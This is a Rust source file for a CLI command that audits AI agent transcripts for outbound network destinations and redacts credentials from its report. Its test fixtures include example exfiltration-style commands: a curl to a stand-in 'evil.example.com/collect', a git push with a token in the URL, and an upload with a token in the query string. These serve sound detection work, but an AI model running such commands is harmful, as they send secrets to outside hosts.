//! `tokenix egress-audit` — scan AI agent conversation transcripts for outbound
//! network destinations (DNS names, IP addresses, API endpoints, registries).
//!
//! Walks the same agent transcript directories as `scan-secrets`, but instead of
//! looking for credentials it collects every external hostname, IP, domain, and
//! URL pattern mentioned in the dialogue. Results are grouped by target host
//! so you can audit what third-party services your AI agents are calling.

use anyhow::Result;
use colored::Colorize;
use regex::Regex;
use rust_embed::Embed;
use serde::Deserialize;
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

const MAX_FILE_BYTES: u64 = 50 * 1024 * 1024;
const TEXT_EXTS: &[&str] = &[
    "jsonl", "json", "ndjson", "log", "md", "txt", "yaml", "yml", "pbtxt",
];

#[derive(Embed)]
#[folder = "assets/egress-rules"]
#[include = "*.toml"]
struct BundledRules;

#[derive(Deserialize)]
struct RuleSpec {
    id: String,
    pattern: String,
    #[serde(default)]
    label: String,
}

#[derive(Deserialize)]
struct RuleFile {
    #[serde(default)]
    rules: Vec<RuleSpec>,
}

#[allow(dead_code)]
struct Rule {
    id: String,
    re: Regex,
    label: String,
}

/// Known-safe / known-dangerous hosts loaded from `~/.tokenix/*.toml`.
#[derive(Deserialize)]
struct HostListFile {
    #[serde(default)]
    safe: Vec<String>,
    #[serde(default)]
    dangerous: Vec<String>,
    #[serde(default)]
    blocklist: Vec<String>,
    #[serde(default)]
    hosts: Vec<String>,
}

#[derive(Clone, Default)]
pub struct HostReputation {
    safe: HashSet<String>,
    dangerous: HashSet<String>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum HostVerdict {
    Safe,
    Dangerous,
    Unknown,
}

impl HostReputation {
    pub fn load() -> Self {
        Self {
            safe: load_host_list("safe-hosts.toml", |f| f.safe),
            dangerous: load_host_list("dangerous-hosts.toml", |mut f| {
                f.dangerous.append(&mut f.blocklist);
                f.dangerous.append(&mut f.hosts);
                f.dangerous
            }),
        }
    }

    pub fn verdict(&self, host: &str) -> HostVerdict {
        if host_matches(&self.dangerous, host) {
            HostVerdict::Dangerous
        } else if host_matches(&self.safe, host) {
            HostVerdict::Safe
        } else {
            HostVerdict::Unknown
        }
    }

    fn has_safe_hosts(&self) -> bool {
        !self.safe.is_empty()
    }

    fn has_dangerous_hosts(&self) -> bool {
        !self.dangerous.is_empty()
    }
}

fn load_host_list(
    file_name: &str,
    select: impl FnOnce(HostListFile) -> Vec<String>,
) -> HashSet<String> {
    let path = dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".tokenix")
        .join(file_name);
    match std::fs::read_to_string(&path) {
        Ok(content) => match toml::from_str::<HostListFile>(&content) {
            Ok(config) => select(config)
                .into_iter()
                .map(|h| normalize_host(&h))
                .filter(|h| !h.is_empty())
                .collect(),
            Err(_) => HashSet::new(),
        },
        Err(_) => HashSet::new(),
    }
}

fn host_matches(list: &HashSet<String>, host: &str) -> bool {
    list.contains(host)
        || list
            .iter()
            .any(|h| host == h || host.ends_with(&format!(".{h}")))
}

fn user_rules_dir() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".tokenix")
        .join("egress-rules")
}

fn parse_rule_specs(content: &str) -> Vec<RuleSpec> {
    toml::from_str::<RuleFile>(content)
        .map(|f| f.rules)
        .unwrap_or_default()
}

fn read_toml_dir(dir: &Path, out: &mut Vec<RuleSpec>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) == Some("toml") {
            if let Ok(content) = std::fs::read_to_string(&path) {
                out.extend(parse_rule_specs(&content));
            }
        }
    }
}

fn compile_rules(specs: Vec<RuleSpec>) -> Vec<Rule> {
    let mut order: Vec<String> = Vec::new();
    let mut by_id: std::collections::HashMap<String, Rule> = std::collections::HashMap::new();
    for spec in specs {
        let re = match Regex::new(&spec.pattern) {
            Ok(re) => re,
            Err(e) => {
                eprintln!(
                    "{} skipping egress rule '{}': invalid regex ({e})",
                    "warning:".yellow(),
                    spec.id
                );
                continue;
            }
        };
        if !by_id.contains_key(&spec.id) {
            order.push(spec.id.clone());
        }
        by_id.insert(
            spec.id.clone(),
            Rule {
                id: spec.id,
                re,
                label: spec.label,
            },
        );
    }
    order
        .into_iter()
        .filter_map(|id| by_id.remove(&id))
        .collect()
}

#[cfg(test)]
fn bundled_rules() -> Vec<Rule> {
    let mut specs = Vec::new();
    for file in BundledRules::iter() {
        if let Some(asset) = BundledRules::get(&file) {
            if let Ok(content) = std::str::from_utf8(&asset.data) {
                specs.extend(parse_rule_specs(content));
            }
        }
    }
    compile_rules(specs)
}

fn load_rules() -> Vec<Rule> {
    let mut specs = Vec::new();
    for file in BundledRules::iter() {
        if let Some(asset) = BundledRules::get(&file) {
            if let Ok(content) = std::str::from_utf8(&asset.data) {
                specs.extend(parse_rule_specs(content));
            }
        }
    }
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let local = crate::store::find_project_root(&cwd)
        .join(".tokenix")
        .join("egress-rules");
    read_toml_dir(&local, &mut specs);
    read_toml_dir(&user_rules_dir(), &mut specs);
    compile_rules(specs)
}

#[cfg_attr(test, derive(Debug))]
struct RawMatch {
    line: usize,
    rule: String,
    host: String,
    target: String,
    repo: Option<String>,
    branch: Option<String>,
}

struct Finding {
    agent: &'static str,
    file: PathBuf,
    line: usize,
    rule: String,
    host: String,
    target: String,
    repo: Option<String>,
    branch: Option<String>,
}

fn extract_line_meta(line: &str) -> (Option<String>, Option<String>) {
    if !line.contains("\"cwd\"") {
        return (None, None);
    }
    let Ok(v) = serde_json::from_str::<serde_json::Value>(line) else {
        return (None, None);
    };
    let nonempty = |s: &str| (!s.is_empty()).then(|| s.to_string());
    (
        v.get("cwd").and_then(|x| x.as_str()).and_then(nonempty),
        v.get("gitBranch")
            .and_then(|x| x.as_str())
            .and_then(nonempty),
    )
}

fn scan_content(content: &str, rules: &[Rule]) -> Vec<RawMatch> {
    let mut out = Vec::new();
    let mut seen: HashSet<(usize, String)> = HashSet::new();
    for (idx, raw_line) in content.lines().enumerate() {
        // JSON transcripts escape forward slashes, so `https:\/\/host` reached
        // the rules as a literal and matched nothing — a silent "no external
        // destinations" for exactly the files this audit reads.
        let unescaped;
        let line = if raw_line.contains("\\/") {
            unescaped = raw_line.replace("\\/", "/");
            unescaped.as_str()
        } else {
            raw_line
        };
        let mut line_hits: Vec<RawMatch> = Vec::new();
        for rule in rules {
            for caps in rule.re.captures_iter(line) {
                // Capture group 1 holds the hostname/IP; if missing, the full match is used.
                let raw_match = caps.get(0).map(|m| m.as_str()).unwrap_or("");
                let raw_host = caps.get(1).map(|m| m.as_str()).unwrap_or(raw_match);
                let host = normalize_host(raw_host);
                if host.is_empty() {
                    continue;
                }
                if seen.insert((idx + 1, format!("{}:{}", rule.id, host))) {
                    line_hits.push(RawMatch {
                        line: idx + 1,
                        rule: rule.id.clone(),
                        host,
                        target: normalize_target(raw_match),
                        repo: None,
                        branch: None,
                    });
                }
            }
        }
        if !line_hits.is_empty() {
            let (repo, branch) = extract_line_meta(line);
            for hit in &mut line_hits {
                hit.repo = repo.clone();
                hit.branch = branch.clone();
            }
            out.append(&mut line_hits);
        }
    }
    out
}

fn normalize_host(raw: &str) -> String {
    let trimmed = trim_target(raw);
    let normalized = trimmed.to_ascii_lowercase();
    let without_scheme = normalized
        .strip_prefix("https://")
        .or_else(|| normalized.strip_prefix("http://"))
        .or_else(|| normalized.strip_prefix("ssh://"))
        .unwrap_or(&normalized);
    // Drop `user:token@` userinfo. `https://<token>@github.com/...` is exactly
    // the exfiltration shape this audit exists to surface, and without this the
    // username was reported as the host — the real destination never appeared,
    // and the reputation check ran against the wrong string.
    let authority = without_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(without_scheme);
    let host_part = match authority.rsplit_once('@') {
        Some((_, after)) => after,
        None => authority,
    };
    let host = host_part
        .split([':', '/', '?', '#'])
        .next()
        .unwrap_or("")
        .trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '.' && c != '-');
    host.strip_prefix("www.").unwrap_or(host).to_string()
}

/// Reported destination, with credentials and query values removed. This report
/// is what a user reads to review sensitive network activity — echoing
/// `?token=sk-...` back into it would leak the very secret it surfaces.
fn normalize_target(raw: &str) -> String {
    let trimmed = trim_target(raw);
    let (base, rest) = match trimmed.split_once(['?', '#']) {
        Some((b, _)) => (b, true),
        None => (trimmed, false),
    };
    // Strip `scheme://user:pass@` → `scheme://`.
    let cleaned = match base.split_once("://") {
        Some((scheme, after)) => match after.split_once('@') {
            Some((_, host_and_path)) => format!("{scheme}://{host_and_path}"),
            None => base.to_string(),
        },
        None => base.to_string(),
    };
    if rest {
        format!("{cleaned}?[REDACTED]")
    } else {
        cleaned
    }
}

fn trim_target(raw: &str) -> &str {
    raw.trim_matches(|c: char| {
        c.is_whitespace()
            || matches!(
                c,
                '"' | '\'' | '`' | '\\' | ',' | ')' | ']' | '}' | ';' | '<' | '>'
            )
    })
}

fn has_text_ext(p: &Path) -> bool {
    p.extension()
        .and_then(|e| e.to_str())
        .map(|e| TEXT_EXTS.contains(&e.to_ascii_lowercase().as_str()))
        .unwrap_or(false)
}

struct Root {
    dir: PathBuf,
    only_basenames: Option<&'static [&'static str]>,
}

struct AgentScan {
    name: &'static str,
    roots: Vec<Root>,
}

fn agent_scans(home: &Path, filter: &str) -> Vec<AgentScan> {
    let root = |dir: PathBuf, only_basenames| Root {
        dir,
        only_basenames,
    };
    let all = vec![
        AgentScan {
            name: "claude",
            roots: vec![root(home.join(".claude").join("projects"), None)],
        },
        AgentScan {
            name: "gemini",
            roots: vec![
                root(
                    home.join(".gemini").join("tmp"),
                    Some(&["logs.json", "checkpoint.json"]),
                ),
                root(home.join(".gemini").join("history"), None),
            ],
        },
        AgentScan {
            name: "copilot",
            roots: vec![
                root(home.join(".copilot").join("session-state"), None),
                root(home.join(".copilot").join("logs"), None),
            ],
        },
        AgentScan {
            name: "antigravity",
            roots: vec![root(home.join(".gemini").join("antigravity"), None)],
        },
    ];
    if filter == "all" {
        all
    } else {
        all.into_iter().filter(|a| a.name == filter).collect()
    }
}

fn collect_files(root: &Root, out: &mut Vec<PathBuf>) {
    if !root.dir.exists() {
        return;
    }
    for entry in WalkDir::new(&root.dir).into_iter().filter_map(|e| e.ok()) {
        if !entry.file_type().is_file() {
            continue;
        }
        let p = entry.path();
        match root.only_basenames {
            Some(names) => {
                let base = p.file_name().and_then(|s| s.to_str()).unwrap_or("");
                if !names.contains(&base) {
                    continue;
                }
            }
            None => {
                if !has_text_ext(p) {
                    continue;
                }
            }
        }
        if std::fs::metadata(p)
            .map(|m| m.len() > MAX_FILE_BYTES)
            .unwrap_or(true)
        {
            continue;
        }
        out.push(p.to_path_buf());
    }
}

fn tilde(home: &Path, p: &Path) -> String {
    p.strip_prefix(home)
        .map(|rest| format!("~/{}", rest.display()))
        .unwrap_or_else(|_| p.display().to_string())
        .replace('\\', "/")
}

fn scan(home: &Path, filter: &str) -> (Vec<Finding>, Vec<(&'static str, usize)>) {
    let ruleset = load_rules();
    let mut findings = Vec::new();
    let mut counts = Vec::new();
    for agent in agent_scans(home, filter) {
        let mut files = Vec::new();
        for root in &agent.roots {
            collect_files(root, &mut files);
        }
        counts.push((agent.name, files.len()));
        for file in files {
            let Ok(bytes) = std::fs::read(&file) else {
                continue;
            };
            let content = String::from_utf8_lossy(&bytes);
            for m in scan_content(&content, &ruleset) {
                findings.push(Finding {
                    agent: agent.name,
                    file: file.clone(),
                    line: m.line,
                    rule: m.rule,
                    host: m.host,
                    target: m.target,
                    repo: m.repo,
                    branch: m.branch,
                });
            }
        }
    }
    (findings, counts)
}

/// Group-mode for the human report.
#[derive(Copy, Clone, PartialEq, Eq)]
pub enum GroupMode {
    None,
    Host,
    Rule,
    Agent,
    File,
}

/// Display + filter options for `egress-audit`.
pub struct Options {
    pub agent: String,
    pub json: bool,
    pub search: Option<String>,
    pub group: GroupMode,
    pub safe: bool,
}

/// An egress finding for programmatic consumers (the TUI). Carries the host so
/// the browser can show it. All-owned, so it is `Send`.
#[allow(dead_code)]
#[derive(Clone)]
pub struct EgressFinding {
    pub agent: String,
    pub rule: String,
    /// `~`-collapsed path, for display.
    pub file: String,
    /// Absolute path.
    pub path: PathBuf,
    pub line: usize,
    pub host: String,
    pub target: String,
    pub repo: Option<String>,
    pub branch: Option<String>,
}

fn group_findings(
    findings: &[Finding],
    key: impl Fn(&Finding) -> String,
) -> Vec<(String, Vec<&Finding>)> {
    let mut order: Vec<String> = Vec::new();
    let mut groups: std::collections::HashMap<String, Vec<&Finding>> =
        std::collections::HashMap::new();
    for f in findings {
        let k = key(f);
        if !groups.contains_key(&k) {
            order.push(k.clone());
        }
        groups.entry(k).or_default().push(f);
    }
    order
        .into_iter()
        .map(|k| {
            let v = groups.remove(&k).unwrap_or_default();
            (k, v)
        })
        .collect()
}

/// Scan every agent's conversations and return findings plus per-agent file counts.
pub fn scan_findings() -> (Vec<EgressFinding>, Vec<(String, usize)>) {
    let Some(home) = dirs::home_dir() else {
        return (Vec::new(), Vec::new());
    };
    let (findings, counts) = scan(&home, "all");
    let mapped = findings
        .into_iter()
        .map(|f| EgressFinding {
            agent: f.agent.to_string(),
            rule: f.rule,
            file: tilde(&home, &f.file),
            path: f.file,
            line: f.line,
            host: f.host,
            target: f.target,
            repo: f.repo,
            branch: f.branch,
        })
        .collect();
    let counts = counts
        .into_iter()
        .map(|(a, n)| (a.to_string(), n))
        .collect();
    (mapped, counts)
}

/// Entry point for `tokenix egress-audit`.
pub fn run(opts: Options) -> Result<usize> {
    let home = dirs::home_dir().ok_or_else(|| anyhow::anyhow!("cannot resolve home directory"))?;
    let (mut findings, counts) = scan(&home, &opts.agent);

    let reputation = HostReputation::load();
    let is_safe =
        |host: &str| -> bool { opts.safe && matches!(reputation.verdict(host), HostVerdict::Safe) };
    let is_dangerous =
        |host: &str| -> bool { matches!(reputation.verdict(host), HostVerdict::Dangerous) };

    if let Some(q) = opts.search.as_ref().map(|s| s.to_lowercase()) {
        findings.retain(|f| {
            f.host.to_lowercase().contains(&q)
                || f.target.to_lowercase().contains(&q)
                || f.rule.to_lowercase().contains(&q)
                || f.agent.contains(q.as_str())
                || tilde(&home, &f.file).to_lowercase().contains(&q)
        });
    }

    if opts.json {
        let out = serde_json::json!({
            "scanned": counts.iter().map(|(a, n)| serde_json::json!({"agent": a, "files": n})).collect::<Vec<_>>(),
            "count": findings.len(),
            "targets": findings.iter().map(|f| {
                let mut o = serde_json::json!({
                    "agent": f.agent,
                    "file": tilde(&home, &f.file),
                    "line": f.line,
                    "rule": f.rule,
                    "host": f.host,
                    "target": f.target,
                });
                if let Some(r) = &f.repo {
                    o["repo"] = serde_json::Value::String(r.clone());
                }
                if let Some(b) = &f.branch {
                    o["branch"] = serde_json::Value::String(b.clone());
                }
                o
            }).collect::<Vec<_>>(),
        });
        println!("{}", serde_json::to_string_pretty(&out)?);
        return Ok(findings.len());
    }

    println!(
        "\n{}\n",
        "tokenix egress-audit — DNS/IP destinations in AI agent conversations"
            .bold()
            .underline()
    );
    let scanned: usize = counts.iter().map(|(_, n)| n).sum();
    let scanned_line = counts
        .iter()
        .map(|(a, n)| format!("{a}({n})"))
        .collect::<Vec<_>>()
        .join("  ");
    println!("  {} {}", "Scanned:".dimmed(), scanned_line);
    if let Some(q) = &opts.search {
        println!("  {} {}", "Filter:".dimmed(), q.cyan());
    }

    if findings.is_empty() {
        let suffix = if opts.search.is_some() {
            " matching the filter"
        } else {
            ""
        };
        println!(
            "\n  {} no external destinations found in {} conversation files{}\n",
            "✓".green().bold(),
            scanned,
            suffix
        );
        return Ok(0);
    }

    println!(
        "\n  {} {} external destination(s) found\n",
        "→".yellow().bold(),
        findings.len()
    );

    match opts.group {
        GroupMode::None => {
            for f in &findings {
                let safe_mark = if is_dangerous(&f.host) {
                    "! "
                } else if is_safe(&f.host) {
                    "✓ "
                } else {
                    "  "
                };
                println!(
                    "  {safe_mark}{:<11} {}:{}",
                    f.agent.cyan(),
                    tilde(&home, &f.file),
                    f.line
                );
                println!("    [{}]  {}", f.rule.yellow(), f.target.bold(),);
            }
        }
        GroupMode::Host => {
            let groups = group_findings(&findings, |f| f.host.clone());
            for (host, members) in &groups {
                let agents: Vec<&str> = members.iter().map(|m| m.agent).collect();
                let mut agents_dedup = agents.clone();
                agents_dedup.sort_unstable();
                agents_dedup.dedup();
                let safe_mark = if is_dangerous(host) {
                    "! "
                } else if is_safe(host) {
                    "✓ "
                } else {
                    "  "
                };
                let host_style = if is_dangerous(host) {
                    host.bold().red()
                } else if is_safe(host) {
                    host.bold().green()
                } else {
                    host.bold().cyan()
                };
                println!(
                    "  {safe_mark}{}  {}",
                    host_style,
                    format!("({}× · {})", members.len(), agents_dedup.join(",")).dimmed()
                );
                for m in members.iter().take(6) {
                    println!(
                        "      {} [{}] {}:{}  {}",
                        m.rule.yellow(),
                        m.agent,
                        tilde(&home, &m.file),
                        m.line,
                        m.target.dimmed()
                    );
                }
                if members.len() > 6 {
                    println!(
                        "      {}",
                        format!("… +{} more", members.len() - 6).dimmed()
                    );
                }
            }
        }
        GroupMode::Rule | GroupMode::Agent | GroupMode::File => {
            let groups = match opts.group {
                GroupMode::Rule => group_findings(&findings, |f| f.rule.clone()),
                GroupMode::Agent => group_findings(&findings, |f| f.agent.to_string()),
                _ => group_findings(&findings, |f| tilde(&home, &f.file)),
            };
            for (label, members) in &groups {
                println!(
                    "  {} {}",
                    label.bold().cyan(),
                    format!("({})", members.len()).dimmed()
                );
                for m in members {
                    let coords = match opts.group {
                        GroupMode::Rule => {
                            format!("{}  {}:{}", m.agent, tilde(&home, &m.file), m.line)
                        }
                        GroupMode::Agent => {
                            format!("[{}]  {}:{}", m.rule, tilde(&home, &m.file), m.line)
                        }
                        _ => format!("[{}]  line {}", m.rule, m.line),
                    };
                    println!("    {}  {}", coords.dimmed(), m.target.bold());
                }
            }
        }
    }

    if opts.safe && reputation.has_safe_hosts() {
        println!(
            "  {} hosts marked ✓ are on the safe list (~/.tokenix/safe-hosts.toml)",
            "note:".dimmed()
        );
    }
    if reputation.has_dangerous_hosts() {
        println!(
            "  {} hosts marked ! are on the dangerous list (~/.tokenix/dangerous-hosts.toml)",
            "note:".dimmed()
        );
    }
    println!();
    Ok(findings.len())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;

    fn test_rules() -> Vec<Rule> {
        bundled_rules()
    }

    #[test]
    fn credentials_in_url_report_the_real_host_not_the_username() {
        let hits = scan_content(
            "git push https://ghp_secrettoken@github.com/org/repo.git",
            &test_rules(),
        );
        assert!(
            hits.iter().any(|h| h.host == "github.com"),
            "hosts: {:?}",
            hits.iter().map(|h| &h.host).collect::<Vec<_>>()
        );
        assert!(
            hits.iter().all(|h| !h.target.contains("ghp_secrettoken")),
            "credential echoed into the report: {:?}",
            hits.iter().map(|h| &h.target).collect::<Vec<_>>()
        );
    }

    #[test]
    fn query_string_secrets_are_redacted_from_the_target() {
        let hits = scan_content(
            "curl https://api.example.com/upload?token=sk-abc123",
            &test_rules(),
        );
        assert!(!hits.is_empty());
        assert!(
            hits.iter().all(|h| !h.target.contains("sk-abc123")),
            "{:?}",
            hits.iter().map(|h| &h.target).collect::<Vec<_>>()
        );
    }

    #[test]
    fn json_escaped_urls_are_still_detected() {
        let hits = scan_content(
            r#"{"cmd":"curl https:\/\/evil.example.com\/collect"}"#,
            &test_rules(),
        );
        assert!(
            hits.iter().any(|h| h.host == "evil.example.com"),
            "escaped URL invisible to the audit"
        );
    }

    #[test]
    fn test_url_hostname() {
        let content = "I downloaded the package from https://example.com/path/file.tar.gz";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "example.com"),
            "should capture hostname from URL, got: {hits:?}"
        );
    }

    #[test]
    fn test_multiple_urls() {
        let content =
            "Using https://api.openai.com/v1 for completion and https://github.com for code";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        let hosts: Vec<&str> = hits.iter().map(|h| h.host.as_str()).collect();
        assert!(
            hosts.contains(&"api.openai.com"),
            "should capture api.openai.com, got: {hosts:?}"
        );
        assert!(
            hosts.contains(&"github.com"),
            "should capture github.com, got: {hosts:?}"
        );
    }

    #[test]
    fn test_ipv4_with_port() {
        let content = "connecting to 192.168.1.1:443";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "192.168.1.1"),
            "should capture IPv4 address, got: {hits:?}"
        );
    }

    #[test]
    fn test_git_remote_ssh() {
        let content = "git@github.com:org/repo.git";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "github.com"),
            "should capture git SSH host, got: {hits:?}"
        );
    }

    #[test]
    fn test_docker_pull() {
        let content = "docker pull ghcr.io/org/image:latest";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host.contains("ghcr.io")),
            "should capture container registry, got: {hits:?}"
        );
    }

    #[test]
    fn test_duplicates_deduped() {
        let content = "https://example.com/foo\nhttps://example.com/bar";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        let example_hits: Vec<&RawMatch> =
            hits.iter().filter(|h| h.host == "example.com").collect();
        assert_eq!(
            example_hits.len(),
            2,
            "same host on different lines should be separate findings, got: {hits:?}"
        );
    }

    #[test]
    fn test_bundled_rules_load() {
        let rules = bundled_rules();
        assert!(
            !rules.is_empty(),
            "should load at least one bundled egress rule"
        );
    }

    #[test]
    fn test_curl_with_url() {
        let content = "curl -X POST https://api.example.com/v1/endpoint";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "api.example.com"),
            "should capture from curl, got: {hits:?}"
        );
    }

    #[test]
    fn test_aws_endpoint() {
        let content = "using https://s3.us-east-1.amazonaws.com/bucket";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "s3.us-east-1.amazonaws.com"),
            "should capture AWS endpoint, got: {hits:?}"
        );
    }

    #[test]
    fn test_ai_api_endpoint() {
        let content = "response from https://api.openai.com/v1/chat";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "api.openai.com"),
            "should capture API endpoint, got: {hits:?}"
        );
    }

    #[test]
    fn test_json_escaped_url_does_not_swallow_patch_fields() {
        let content = r#"https://api.openai.com/v1\"),","newString":"."#;
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        let hit = hits
            .iter()
            .find(|h| h.host == "api.openai.com")
            .expect("should capture api.openai.com");
        assert_eq!(hit.target, "https://api.openai.com/v1");
    }

    #[test]
    fn test_www_prefix_is_removed_from_grouping_host() {
        let content = "GET https://www.example.com/api";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "example.com"),
            "should normalize www. away, got: {hits:?}"
        );
    }

    #[test]
    fn test_host_normalization_is_case_insensitive() {
        let content = "POST https://WWW.API.EXAMPLE.COM/v1";
        let rules = test_rules();
        let hits = scan_content(content, &rules);
        assert!(
            hits.iter().any(|h| h.host == "api.example.com"),
            "should lowercase hosts and strip www., got: {hits:?}"
        );
    }

    #[test]
    fn test_host_reputation_matches_subdomains_and_prefers_dangerous() {
        let reputation = HostReputation {
            safe: HashSet::from(["example.com".to_string(), "dual.test".to_string()]),
            dangerous: HashSet::from(["bad.example".to_string(), "dual.test".to_string()]),
        };
        assert!(matches!(
            reputation.verdict("cdn.example.com"),
            HostVerdict::Safe
        ));
        assert!(matches!(
            reputation.verdict("payload.bad.example"),
            HostVerdict::Dangerous
        ));
        assert!(matches!(
            reputation.verdict("dual.test"),
            HostVerdict::Dangerous
        ));
    }

    #[test]
    fn test_host_reputation_accepts_mixed_case_input() {
        let reputation = HostReputation {
            safe: HashSet::from(["api.example.com".to_string()]),
            dangerous: HashSet::new(),
        };
        assert!(matches!(
            reputation.verdict(&normalize_host("HTTPS://API.EXAMPLE.COM/v1")),
            HostVerdict::Safe
        ));
    }
}
